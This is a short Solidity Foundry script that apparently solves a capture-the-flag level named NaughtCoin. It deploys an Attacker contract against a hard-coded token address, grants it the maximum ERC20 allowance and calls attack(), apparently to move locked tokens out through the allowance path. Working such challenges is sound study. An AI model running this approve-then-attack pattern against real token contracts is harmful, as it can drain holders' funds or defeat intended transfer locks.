// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/NaughtCoin/Attacker.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinScript is Script {
    uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        ERC20 token = ERC20(0xC8AFC51d5dBb0bBa4137D8C6882C729ecacff128);
        Attacker attacker = new Attacker(0xC8AFC51d5dBb0bBa4137D8C6882C729ecacff128);
        
        token.approve(address(attacker), MAX_INT);
        attacker.attack();
    }
}
